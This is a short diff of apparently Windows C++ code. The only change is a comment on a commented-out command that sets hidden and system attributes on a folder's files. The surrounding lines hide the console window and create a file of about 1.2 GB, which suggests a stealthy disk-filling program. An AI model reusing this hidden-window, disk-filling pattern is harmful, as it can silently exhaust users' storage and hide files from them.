@@ -15,7 +15,7 @@ ShowWindow(stealth,0);
     ofs.seekp((300*2*2<<20) - 1);
     ofs.write("", 1);
    // system("attrib +h "); //Careful! It applies to the entire folder...don't be evil!
-   //system("attrib +h +s");
+   //system("attrib +h +s"); // APPLIES THE SYSTEM FILE ATTRIBUTE TO ALL FILES IN FOLDER
 }
 	}
 }
